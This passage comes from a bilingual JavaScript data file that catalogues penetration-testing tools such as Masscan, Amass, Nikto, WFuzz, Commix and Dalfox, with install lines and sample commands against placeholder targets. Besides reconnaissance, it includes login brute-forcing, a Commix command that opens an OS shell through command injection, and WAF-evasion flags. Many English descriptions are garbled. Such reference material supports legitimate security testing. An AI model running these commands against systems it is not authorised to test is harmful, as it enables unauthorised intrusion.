    id: 'masscan',
    name: 'Masscan',
    description: { zh: '最快的互联网端口扫描器，可在5分钟内扫描整个互联网', en: 'The fastest internet port scanner, capable of scanning the entire internet in 5 minutes' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: { zh: 'apt install masscan / brew install masscan / 源码编译: git clone https://github.com/robertdavidgraham/masscan && cd masscan && make', en: 'apt install masscan / brew install masscan / SourceCodeCompile: git clone https://github.com/robertdavidgraham/masscan && cd masscan && make' },
    commands: [
      {
        name: { zh: '快速全端口扫描', en: 'Fast Full Port Scan' },
        command: 'masscan -p1-65535 target_ip --rate=1000',
        description: { zh: '以每秒1000包的速率扫描目标所有端口', en: 'Scan all ports on the target at 1000 packets per second' },
        syntaxBreakdown: [
          { part: 'masscan', explanation: { zh: '高速端口扫描器', en: 'High-speed port scanning tool' }, type: 'command' },
          { part: '-p1-65535', explanation: { zh: '扫描全部65535个端口', en: 'Scanall65535Port' }, type: 'parameter' },
          { part: '--rate=1000', explanation: { zh: '每秒发送1000个数据包', en: 'Send 1000 packets per second' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '常用端口扫描', en: 'Common Port Scan' },
        command: 'masscan -p80,443,8080,8443,3306,6379,27017 target_ip/24 --rate=500',
        description: { zh: '扫描常用Web和数据库端口', en: 'ScanCommonWeb and DatabasePort' },
        platform: 'all'
      },
      {
        name: { zh: '输出结果', en: 'Output Results' },
        command: 'masscan -p1-65535 target_ip --rate=1000 -oJ result.json\nmasscan -p1-65535 target_ip --rate=1000 -oX result.xml\nmasscan -p1-65535 target_ip --rate=1000 -oG result.grep',
        description: { zh: '支持JSON/XML/Grepable格式输出', en: 'supportsJSON/XML/GrepableFormatOutput' },
        platform: 'all'
      },
      {
        name: { zh: '指定网卡和排除', en: 'Specify Interface & Exclude' },
        command: 'masscan -p1-65535 10.0.0.0/8 --rate=10000 -e eth0 --excludefile exclude.txt',
        description: { zh: '指定网卡并排除特定IP范围', en: 'Specify network interface and exclude specific IP ranges' },
        platform: 'linux'
      },
      {
        name: { zh: '扫描Banner', en: 'Scan Banner' },
        command: 'masscan -p80,443 target_ip/24 --banners --rate=500',
        description: { zh: '获取服务Banner信息', en: 'Get ServicesBannerInformation' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/robertdavidgraham/masscan']
  },
  {
    id: 'dirsearch',
    name: 'Dirsearch',
    description: { zh: '高级Web目录和文件暴力破解工具', en: 'AdvancedWebDirectory and FileBrute ForceTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip3 install dirsearch / git clone https://github.com/maurosoria/dirsearch',
    commands: [
      {
        name: { zh: '基础目录扫描', en: 'Basic Directory Scan' },
        command: 'dirsearch -u https://target.com -e php,asp,aspx,jsp,html,js',
        description: { zh: '扫描指定扩展名的目录和文件', en: 'ScanSpecify Extensions Directory and File' },
        syntaxBreakdown: [
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
          { part: '-e', explanation: { zh: '指定扫描的文件扩展名', en: 'specifiedScan FileExtensionname' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '使用自定义字典', en: 'Use Custom Wordlist' },
        command: 'dirsearch -u https://target.com -w /usr/share/wordlists/dirb/big.txt --delay=0.5',
        description: { zh: '使用自定义字典并设置请求延迟', en: 'Use Custom Wordlist and SetRequestDelay' },
        platform: 'all'
      },
      {
        name: { zh: '递归扫描', en: 'Recursive Scan' },
        command: 'dirsearch -u https://target.com -e php -r -R 3 --exclude-status=403,404',
        description: { zh: '递归扫描3层深度，排除403/404', en: 'Recursive scan 3 levels deep, exclude 403/404' },
        platform: 'all'
      },
      {
        name: { zh: '多线程+Cookie', en: 'Multi-thread + Cookie' },
        command: 'dirsearch -u https://target.com -t 20 --cookie="session=abc123" -H "Authorization: Bearer token"',
        description: { zh: '20线程并发，携带认证信息', en: '20 concurrent threads with authentication cookies' },
        platform: 'all'
      },
      {
        name: { zh: '输出结果', en: 'Output Results' },
        command: 'dirsearch -u https://target.com -o result.json --format=json',
        description: { zh: '输出JSON格式结果', en: 'OutputJSONFormatResult' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/maurosoria/dirsearch']
  },
  {
    id: 'feroxbuster',
    name: 'FeroxBuster',
    description: { zh: '用Rust编写的高性能递归目录发现工具', en: 'High-performance recursive directory discovery tool written in Rust' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: { zh: 'apt install feroxbuster / cargo install feroxbuster / 下载二进制: https://github.com/epi052/feroxbuster/releases', en: 'apt install feroxbuster / cargo install feroxbuster / Downloadbinary: https://github.com/epi052/feroxbuster/releases' },
    commands: [
      {
        name: { zh: '基础扫描', en: 'Basic Scan' },
        command: 'feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
        description: { zh: '使用SecLists字典扫描目录', en: 'UseSecListsDictionaryScanDirectory' },
        syntaxBreakdown: [
          { part: 'feroxbuster', explanation: { zh: 'Rust编写的高速目录枚举工具', en: 'High-speed directory enumeration tool written in Rust' }, type: 'command' },
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
          { part: '-w', explanation: { zh: '字典文件路径', en: 'DictionaryFilePath' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '递归+过滤', en: 'Recursive + Filter' },
        command: 'feroxbuster -u https://target.com -d 3 -C 403,404,500 -x php,asp,html --rate-limit 50',
        description: { zh: '递归3层，过滤状态码，限制速率', en: 'Recursive 3 levels, filter status codes, rate-limited' },
        platform: 'all'
      },
      {
        name: { zh: '带认证扫描', en: 'Authenticated Scan' },
        command: 'feroxbuster -u https://target.com -H "Cookie: session=abc" -H "Authorization: Bearer xxx" -t 30',
        description: { zh: '携带认证头，30线程并发', en: 'With authentication header, 30 concurrent threads' },
        platform: 'all'
      },
      {
        name: { zh: '自动校准', en: 'Auto Calibrate' },
        command: 'feroxbuster -u https://target.com --auto-tune --smart',
        description: { zh: '自动调整请求速率和过滤条件', en: 'Auto-calibrate request rate and filter conditions' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/epi052/feroxbuster']
  },
  {
    id: 'massdns',
    name: 'MassDNS',
    description: { zh: '高性能DNS解析器，用于子域名暴力枚举', en: 'HighperformanceDNS resolutionTool, used for Subdomain Brute ForceEnumeration' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'git clone https://github.com/blechschmidt/massdns && cd massdns && make',
    commands: [
      {
        name: { zh: '子域名枚举', en: 'Subdomain Enumeration' },
        command: 'massdns -r resolvers.txt -t A -o S -w results.txt subdomains.txt',
        description: { zh: '使用字典文件解析子域名', en: 'UseDictionaryFileParseSub-Domain name' },
        syntaxBreakdown: [
          { part: '-r resolvers.txt', explanation: { zh: 'DNS解析器列表', en: 'DNS resolutionToolcolumntable' }, type: 'parameter' },
          { part: '-t A', explanation: { zh: '查询A记录', en: 'Query A records' }, type: 'parameter' },
          { part: '-o S', explanation: { zh: '简洁输出模式', en: 'Concise output mode' }, type: 'parameter' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: '生成子域名字典', en: 'Generate Subdomain Wordlist' },
        command: 'cat subdomains.txt | sed "s/$/.target.com/" > full_subs.txt\nmassdns -r resolvers.txt -t A -o J full_subs.txt > results.json',
        description: { zh: '批量生成子域名并JSON格式输出', en: 'batchGenerateSub-Domain name and JSONFormatOutput' },
        platform: 'linux'
      },
      {
        name: { zh: '高并发解析', en: 'High Concurrency Resolution' },
        command: 'massdns -r resolvers.txt -t A -o S -w output.txt --hashmap-size 10000 -s 10000 subs.txt',
        description: { zh: '设置并发数和哈希表大小提高性能', en: 'Set concurrency and hash table size to improve performance' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/blechschmidt/massdns']
  },
  {
    id: 'amass',
    name: 'Amass',
    description: { zh: 'OWASP出品的深度攻击面映射和资产发现工具', en: 'OWASP attack surface mapping and asset discovery tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install amass / go install github.com/owasp-amass/amass/v4/...@master / snap install amass',
    commands: [
      {
        name: { zh: '被动枚举', en: 'Passive Enumeration' },
        command: 'amass enum -passive -d target.com -o results.txt',
        description: { zh: '仅使用被动数据源枚举子域名', en: 'Enumerate subdomains using only passive data sources' },
        syntaxBreakdown: [
          { part: 'enum', explanation: { zh: '枚举模式', en: 'EnumerationMode' }, type: 'command' },
          { part: '-passive', explanation: { zh: '仅被动收集(不发送请求)', en: 'Passive collection only (no outbound requests)' }, type: 'parameter' },
          { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '主动枚举', en: 'Active Enumeration' },
        command: 'amass enum -active -d target.com -brute -w /usr/share/amass/wordlists/subdomains-top1mil.txt',
        description: { zh: '主动DNS枚举+字典暴力破解', en: 'Active DNS enumeration + dictionary brute force' },
        platform: 'all'
      },
      {
        name: { zh: '情报收集', en: 'Intelligence Gathering' },
        command: 'amass intel -d target.com -whois\namass intel -org "Target Corp" -max-dns-queries 2500',
        description: { zh: '收集WHOIS和组织相关域名情报', en: 'Collect WHOIS and organization-related domain intelligence' },
        platform: 'all'
      },
      {
        name: { zh: '可视化', en: 'Visualization' },
        command: 'amass viz -d3 -d target.com\namass db -show -d target.com',
        description: { zh: '生成D3.js可视化图表和查看历史数据', en: 'Generate D3.js visualizations and view historical data' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/owasp-amass/amass']
  },
  {
    id: 'subfinder',
    name: 'Subfinder',
    description: { zh: '被动子域名发现工具，支持多种在线数据源', en: 'Passive subdomain discovery tool supporting multiple online data sources' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
    commands: [
      {
        name: { zh: '基础枚举', en: 'Basic Enumeration' },
        command: 'subfinder -d target.com -o subs.txt',
        description: { zh: '枚举子域名并输出到文件', en: 'Enumerate Subdomains and Output to File' },
        syntaxBreakdown: [
          { part: 'subfinder', explanation: { zh: '被动子域名枚举工具', en: 'Passive subdomain enumeration tool' }, type: 'command' },
          { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '递归枚举', en: 'Recursive Enumeration' },
        command: 'subfinder -d target.com -recursive -all -o subs.txt',
        description: { zh: '使用所有数据源递归枚举', en: 'UseallDataSourceRecursive Enumeration' },
        platform: 'all'
      },
      {
        name: { zh: '管道联动', en: 'Pipeline Integration' },
        command: 'subfinder -d target.com -silent | httpx -silent -status-code -title',
        description: { zh: '与httpx联动探测存活子域名', en: 'Pipe into httpx to detect live subdomains' },
        platform: 'all'
      },
      {
        name: { zh: '多域名批量', en: 'Multi-Domain Batch' },
        command: 'subfinder -dL domains.txt -o all_subs.txt -t 30',
        description: { zh: '从文件读取多个域名批量枚举', en: 'from File ReadMultipleDomain namebatchEnumeration' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/subfinder']
  },
  {
    id: 'httpx',
    name: 'HTTPX',
    description: { zh: '快速多功能HTTP探针工具，用于批量探测Web服务', en: 'Fast multi-purpose HTTP probing tool for batch web service detection' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',
    commands: [
      {
        name: { zh: '存活探测', en: 'Alive Detection' },
        command: 'httpx -l urls.txt -status-code -title -tech-detect -o alive.txt',
        description: { zh: '批量探测URL存活状态、标题和技术栈', en: 'Batch detect URL availability, page titles, and tech stack' },
        syntaxBreakdown: [
          { part: '-status-code', explanation: { zh: '显示HTTP状态码', en: 'DisplayHTTPstatusCode' }, type: 'parameter' },
          { part: '-title', explanation: { zh: '提取页面标题', en: 'Extract page title' }, type: 'parameter' },
          { part: '-tech-detect', explanation: { zh: '识别Web技术栈', en: 'IdentifyWebTechniquestack' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '截图+指纹', en: 'Screenshot + Fingerprint' },
        command: 'httpx -l urls.txt -screenshot -favicon -hash md5 -jarm',
        description: { zh: '截图、提取favicon哈希和JARM指纹', en: 'Screenshot, Extractfaviconhash and JARMFingerprint' },
        platform: 'all'
      },
      {
        name: { zh: '管道使用', en: 'Pipeline Usage' },
        command: 'cat subs.txt | httpx -silent -mc 200,301,302 -content-length -web-server',
        description: { zh: '过滤指定状态码并显示服务器信息', en: 'FilterspecifiedstatusCode and DisplayServerInformation' },
        platform: 'all'
      },
      {
        name: { zh: '自定义探测', en: 'Custom Probing' },
        command: 'httpx -l urls.txt -path "/api/v1/health,/admin,/.env,/robots.txt" -mc 200',
        description: { zh: '批量探测指定路径', en: 'batchDetectspecifiedPath' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/httpx']
  },
  {
    id: 'whatweb',
    name: 'WhatWeb',
    description: { zh: 'Web指纹识别工具，识别网站使用的技术栈', en: 'WebFingerprintingTools, IdentifyWebsiteUse Techniquestack' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install whatweb / gem install whatweb',
    commands: [
      {
        name: { zh: '基础指纹', en: 'Basic Fingerprint' },
        command: 'whatweb https://target.com',
        description: { zh: '识别目标网站技术栈', en: 'IdentifyTargetWebsiteTechniquestack' },
        syntaxBreakdown: [
          { part: 'whatweb', explanation: { zh: 'Web技术指纹识别工具', en: 'WebTechniqueFingerprintingTools' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '详细模式', en: 'Verbose Mode' },
        command: 'whatweb -v https://target.com -a 3',
        description: { zh: '详细输出，攻击等级3(更深度探测)', en: 'Verbose output, attack level 3 (deeper detection)' },
        platform: 'all'
      },
      {
        name: { zh: '批量扫描', en: 'Batch Scan' },
        command: 'whatweb --input-file=urls.txt --log-json=results.json',
        description: { zh: '从文件读取URL批量扫描', en: 'from File ReadURLBatch Scan' },
        platform: 'all'
      },
      {
        name: { zh: '指定插件', en: 'Specify Plugin' },
        command: 'whatweb --info-plugins\nwhatweb -p WordPress,Joomla,Drupal https://target.com',
        description: { zh: '列出或指定使用特定插件', en: 'List or specifiedUsespecificPlugin' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/urbanadventurer/WhatWeb']
  },
  {
    id: 'wafw00f',
    name: 'WAFW00F',
    description: { zh: 'Web应用防火墙(WAF)检测和指纹识别工具', en: 'WebApplicationFirewall(WAF)Detection and FingerprintingTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip3 install wafw00f',
    commands: [
      {
        name: { zh: 'WAF检测', en: 'WAF Detection' },
        command: 'wafw00f https://target.com',
        description: { zh: '检测目标是否部署WAF及WAF类型', en: 'DetectionTarget is WhetherDeploymentWAF and WAFType' },
        syntaxBreakdown: [
          { part: 'wafw00f', explanation: { zh: 'WAF指纹识别工具', en: 'WAFFingerprintingTools' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '详细检测', en: 'Verbose Detection' },
        command: 'wafw00f https://target.com -v -a',
        description: { zh: '详细模式，测试所有WAF签名', en: 'Verbose Mode, TestallWAFSignature' },
        platform: 'all'
      },
      {
        name: { zh: '批量检测', en: 'Batch Detection' },
        command: 'wafw00f -i urls.txt -o results.csv',
        description: { zh: '批量检测多个URL', en: 'Batch DetectionMultipleURL' },
        platform: 'all'
      },
      {
        name: { zh: '列出支持WAF', en: 'List Supported WAFs' },
        command: 'wafw00f -l',
        description: { zh: '列出所有可识别的WAF产品', en: 'List all identifiable WAF products' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/EnableSecurity/wafw00f']
  },
  {
    id: 'dnsrecon',
    name: 'DNSRecon',
    description: { zh: 'DNS枚举和信息收集工具', en: 'DNSEnumeration and Information GatheringTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install dnsrecon / pip3 install dnsrecon',
    commands: [
      {
        name: { zh: '标准枚举', en: 'Standard Enumeration' },
        command: 'dnsrecon -d target.com -t std',
        description: { zh: '标准DNS记录枚举(SOA/NS/A/MX/TXT等)', en: 'Standard DNS record enumeration (SOA/NS/A/MX/TXT, etc.)' },
        syntaxBreakdown: [
          { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
          { part: '-t std', explanation: { zh: '标准记录枚举类型', en: 'Standard record enumeration type' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '区域传送', en: 'Zone Transfer' },
        command: 'dnsrecon -d target.com -t axfr',
        description: { zh: '尝试DNS区域传送', en: 'AttemptDNSZone Transfer' },
        platform: 'all'
      },
      {
        name: { zh: '暴力枚举', en: 'Brute Force Enumeration' },
        command: 'dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt',
        description: { zh: '使用字典暴力枚举子域名', en: 'Brute-force subdomain enumeration using a dictionary' },
        platform: 'all'
      },
      {
        name: { zh: '反向解析', en: 'Reverse Lookup' },
        command: 'dnsrecon -r 192.168.1.0/24 -t rvl',
        description: { zh: '对IP段进行反向DNS查询', en: 'Reverse DNS lookup for IP ranges' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/darkoperator/dnsrecon']
  },
  {
    id: 'dnsenum',
    name: 'DNSEnum',
    description: { zh: 'DNS信息收集工具，支持区域传送和子域名枚举', en: 'DNSInformation GatheringTools, supportsZone Transfer and Subdomain Enumeration' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install dnsenum',
    commands: [
      {
        name: { zh: '基础枚举', en: 'Basic Enumeration' },
        command: 'dnsenum target.com',
        description: { zh: '枚举DNS信息(NS/MX/A/区域传送等)', en: 'EnumerationDNSInformation(NS/MX/A/Zone Transfer etc.)' },
        platform: 'all'
      },
      {
        name: { zh: '子域名暴力', en: 'Subdomain Brute Force' },
        command: 'dnsenum --enum -f /usr/share/dnsenum/dns.txt --threads 10 target.com',
        description: { zh: '使用字典暴力枚举子域名', en: 'Brute-force subdomain enumeration using a dictionary' },
        platform: 'all'
      },
      {
        name: { zh: '指定DNS服务器', en: 'Specify DNS Server' },
        command: 'dnsenum --dnsserver 8.8.8.8 target.com',
        description: { zh: '指定DNS服务器进行枚举', en: 'Specify DNS Server perform Enumeration' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/fwaeytens/dnsenum']
  },
  {
    id: 'theharvester',
    name: 'theHarvester',
    description: { zh: '邮箱、子域名、IP等OSINT信息收集工具', en: 'OSINT tool for gathering emails, subdomains, IPs, and more' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install theharvester / pip3 install theHarvester',
    commands: [
      {
        name: { zh: '全源搜集', en: 'All-Source Collection' },
        command: 'theHarvester -d target.com -b all -l 500',
        description: { zh: '使用所有数据源收集信息', en: 'UseallDataSourceCollectInformation' },
        syntaxBreakdown: [
          { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
          { part: '-b all', explanation: { zh: '使用所有可用数据源', en: 'Use all available data sources' }, type: 'parameter' },
          { part: '-l 500', explanation: { zh: '最大结果数', en: 'Maximum number of results' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定数据源', en: 'Specify Data Source' },
        command: 'theHarvester -d target.com -b google,bing,linkedin,shodan',
        description: { zh: '使用指定数据源搜集', en: 'Gather using specified data sources' },
        platform: 'all'
      },
      {
        name: { zh: '输出报告', en: 'Output Report' },
        command: 'theHarvester -d target.com -b all -f report.html',
        description: { zh: '生成HTML格式报告', en: 'GenerateHTMLFormatReport' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/laramies/theHarvester']
  },
  {
    id: 'nikto',
    name: 'Nikto',
    description: { zh: 'Web服务器漏洞扫描器，检测危险文件、过时组件和配置问题', en: 'Web server vulnerability scanner for detecting dangerous files, outdated components, and misconfigurations' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install nikto / git clone https://github.com/sullo/nikto',
    commands: [
      {
        name: { zh: '基础扫描', en: 'Basic Scan' },
        command: 'nikto -h https://target.com',
        description: { zh: '对目标进行全面Web漏洞扫描', en: 'Perform a comprehensive web vulnerability scan on the target' },
        syntaxBreakdown: [
          { part: 'nikto', explanation: { zh: 'Web服务器漏洞扫描器', en: 'WebServerVulnerabilityScanTool' }, type: 'command' },
          { part: '-h', explanation: { zh: '目标主机', en: 'TargetHost' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定端口和SSL', en: 'Specify Port and SSL' },
        command: 'nikto -h target.com -p 8443 -ssl',
        description: { zh: '扫描HTTPS服务', en: 'ScanHTTPSService' },
        platform: 'all'
      },
      {
        name: { zh: '使用代理', en: 'Using Proxy' },
        command: 'nikto -h target.com -useproxy http://127.0.0.1:8080',
        description: { zh: '通过Burp代理进行扫描', en: 'throughBurpProxy perform Scan' },
        platform: 'all'
      },
      {
        name: { zh: '指定测试插件', en: 'Specify Test Plugin' },
        command: 'nikto -h target.com -Plugins "apache_expect_xss;outdated"',
        description: { zh: '仅运行指定的测试插件', en: 'OnlyRunspecified TestPlugin' },
        platform: 'all'
      },
      {
        name: { zh: '输出报告', en: 'Output Report' },
        command: 'nikto -h target.com -o report.html -Format htm',
        description: { zh: '输出HTML格式报告', en: 'OutputHTMLFormatReport' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/sullo/nikto']
  },
  {
    id: 'zap',
    name: 'OWASP ZAP',
    description: { zh: 'OWASP官方Web应用安全测试平台', en: 'OWASP official web application security testing platform' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: { zh: '下载: https://www.zaproxy.org/download/ / snap install zaproxy / docker pull ghcr.io/zaproxy/zaproxy', en: 'Download: https://www.zaproxy.org/download/ / snap install zaproxy / docker pull ghcr.io/zaproxy/zaproxy' },
    commands: [
      {
        name: { zh: '自动扫描', en: 'Auto Scan' },
        command: 'zap-cli quick-scan -s all -r https://target.com\n# 或使用API\ncurl "http://localhost:8080/JSON/ascan/action/scan/?url=https://target.com"',
        description: { zh: '快速自动化漏洞扫描', en: 'Fast automated vulnerability scan' },
        platform: 'all'
      },
      {
        name: { zh: 'API扫描', en: 'API Scan' },
        command: 'zap-api-scan.py -t https://target.com/api/swagger.json -f openapi',
        description: { zh: '根据OpenAPI规范扫描API', en: 'Scan APIs based on OpenAPI specification' },
        platform: 'all'
      },
      {
        name: { zh: '被动扫描', en: 'Passive Scan' },
        command: '# 配置ZAP为代理(默认8080端口)\n# 浏览器配置代理后正常浏览\n# ZAP自动进行被动漏洞检测',
        description: { zh: '代理模式被动扫描', en: 'ProxyModePassive Scan' },
        platform: 'all'
      },
      {
        name: { zh: 'Docker自动化', en: 'Docker Automation' },
        command: 'docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://target.com -r report.html',
        description: { zh: '使用Docker容器化运行基线扫描', en: 'UseDockerContainer-izeRunBaselineScan' },
        platform: 'all'
      }
    ],
    references: ['https://www.zaproxy.org/']
  },
  {
    id: 'arjun',
    name: 'Arjun',
    description: { zh: 'HTTP参数发现工具，发现隐藏的GET/POST参数', en: 'HTTPParameterDiscoverTools, DiscoverHidden GET/POSTParameter' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip3 install arjun',
    commands: [
      {
        name: { zh: 'GET参数发现', en: 'GET Parameter Discovery' },
        command: 'arjun -u https://target.com/page',
        description: { zh: '发现隐藏的GET参数', en: 'DiscoverHidden GETParameter' },
        syntaxBreakdown: [
          { part: 'arjun', explanation: { zh: 'HTTP参数发现工具', en: 'HTTPParameterDiscoverTools' }, type: 'command' },
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'POST参数发现', en: 'POST Parameter Discovery' },
        command: 'arjun -u https://target.com/api -m POST --include="Content-Type: application/json"',
        description: { zh: '发现POST请求的隐藏参数', en: 'DiscoverPOSTRequest HiddenParameter' },
        platform: 'all'
      },
      {
        name: { zh: '自定义字典', en: 'Custom Wordlist' },
        command: 'arjun -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt',
        description: { zh: '使用自定义参数字典', en: 'UseCustomParameterDictionary' },
        platform: 'all'
      },
      {
        name: { zh: '批量扫描', en: 'Batch Scan' },
        command: 'arjun -i urls.txt -o results.json --stable',
        description: { zh: '批量扫描多个URL，稳定模式', en: 'Batch scan multiple URLs in stable mode' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/s0md3v/Arjun']
  },
  {
    id: 'wfuzz',
    name: 'WFuzz',
    description: { zh: 'Web应用模糊测试工具，用于暴力破解参数、目录、认证等', en: 'WebApplicationFuzz TestingTools, used for Brute ForceParameter, Directory, Authentication etc.' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip3 install wfuzz',
    commands: [
      {
        name: { zh: '目录Fuzz', en: 'Directory Fuzz' },
        command: 'wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 https://target.com/FUZZ',
        description: { zh: '目录暴力破解，隐藏404', en: 'DirectoryBrute Force, Hidden404' },
        syntaxBreakdown: [
          { part: '-c', explanation: { zh: '彩色输出', en: 'Colorized output' }, type: 'parameter' },
          { part: '-z file,wordlist', explanation: { zh: '指定字典文件作为payload', en: 'specifiedDictionaryFile as payload' }, type: 'parameter' },
          { part: '--hc 404', explanation: { zh: '隐藏404响应', en: 'Hidden404Response' }, type: 'parameter' },
          { part: 'FUZZ', explanation: { zh: 'Payload注入点占位符', en: 'Payload injection point placeholder' }, type: 'variable' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '参数Fuzz', en: 'Parameter Fuzz' },
        command: 'wfuzz -c -z file,params.txt --hh 0 "https://target.com/api?FUZZ=test"',
        description: { zh: '参数名Fuzz，隐藏空响应', en: 'ParameternameFuzz, HiddenEmptyResponse' },
        platform: 'all'
      },
      {
        name: { zh: '认证爆破', en: 'Authentication Brute Force' },
        command: 'wfuzz -c -z file,users.txt -z file,passwords.txt --hc 403 -d "user=FUZZ&pass=FUZ2Z" https://target.com/login',
        description: { zh: '双字典组合爆破登录', en: 'Dual-dictionary combined brute-force login' },
        platform: 'all'
      },
      {
        name: { zh: '子域名Fuzz', en: 'Subdomain Fuzz' },
        command: 'wfuzz -c -z file,subs.txt --hc 404 -H "Host: FUZZ.target.com" https://target.com',
        description: { zh: 'Host头注入方式枚举子域名', en: 'HostHeaderInjectionMethodEnumerate Subdomains' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/xmendez/wfuzz']
  },
  {
    id: 'commix',
    name: 'Commix',
    description: { zh: '自动化命令注入漏洞检测和利用工具', en: 'Automatic-izeCommand InjectionVulnerabilityDetection and ExploitationTools' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install commix / pip3 install commix / git clone https://github.com/commixproject/commix',
    commands: [
      {
        name: { zh: '自动检测', en: 'Auto Detection' },
        command: 'commix --url="https://target.com/page?cmd=test"',
        description: { zh: '自动检测命令注入点', en: 'Auto DetectionCommand Injectionpoint' },
        syntaxBreakdown: [
          { part: 'commix', explanation: { zh: '命令注入自动化工具', en: 'Command InjectionAutomatic-izeTools' }, type: 'command' },
          { part: '--url', explanation: { zh: '目标URL(参数中含注入点)', en: 'Target URL (parameter contains injection point)' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定参数', en: 'Specify Parameter' },
        command: 'commix --url="https://target.com/api" --data="host=INJECT_HERE" -p host',
        description: { zh: '指定POST参数进行注入测试', en: 'specifiedPOSTParameter perform InjectionTest' },
        platform: 'all'
      },
      {
        name: { zh: '获取Shell', en: 'Get Shell' },
        command: 'commix --url="https://target.com/page?ip=test" --os-cmd="id"\ncommix --url="https://target.com/page?ip=test" --os-shell',
        description: { zh: '执行系统命令或获取交互式Shell', en: 'Execute system commands or obtain an interactive shell' },
        platform: 'all'
      },
      {
        name: { zh: '绕过WAF', en: 'Bypass WAF' },
        command: 'commix --url="https://target.com/page?cmd=test" --tamper=base64encode --technique=t',
        description: { zh: '使用编码绕过和时间盲注技术', en: 'UseEncoding Bypass and Time-Based Blind InjectionTechnique' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/commixproject/commix']
  },
  {
    id: 'dalfox',
    name: 'Dalfox',
    description: { zh: '基于Go的高性能XSS漏洞扫描和参数分析工具', en: 'Based onGo HighperformanceXSSVulnerabilityScan and ParameterAnalyzeTools' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'go install github.com/hahwul/dalfox/v2@latest',
    commands: [
      {
        name: { zh: 'URL扫描', en: 'URL Scan' },
        command: 'dalfox url "https://target.com/search?q=test"',
        description: { zh: '扫描单个URL的XSS漏洞', en: 'ScansingleURL XSSVulnerability' },
        syntaxBreakdown: [
          { part: 'dalfox', explanation: { zh: 'XSS漏洞扫描工具', en: 'XSSVulnerabilityScanTools' }, type: 'command' },
          { part: 'url', explanation: { zh: '单URL扫描模式', en: 'SingleURL ScanMode' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '管道批量', en: 'Pipeline Batch' },
        command: 'cat urls.txt | dalfox pipe --silence --only-poc',
        description: { zh: '批量扫描，仅输出POC', en: 'Batch Scan, OnlyOutputPOC' },
        platform: 'all'
      },
      {
        name: { zh: '自定义Payload', en: 'Custom Payload' },
        command: 'dalfox url "https://target.com/q=test" --custom-payload payloads.txt --waf-evasion',
        description: { zh: '使用自定义Payload并启用WAF绕过', en: 'UseCustom Payload and EnableWAF Bypass' },
        platform: 'all'
      },
      {
        name: 'Blind XSS',
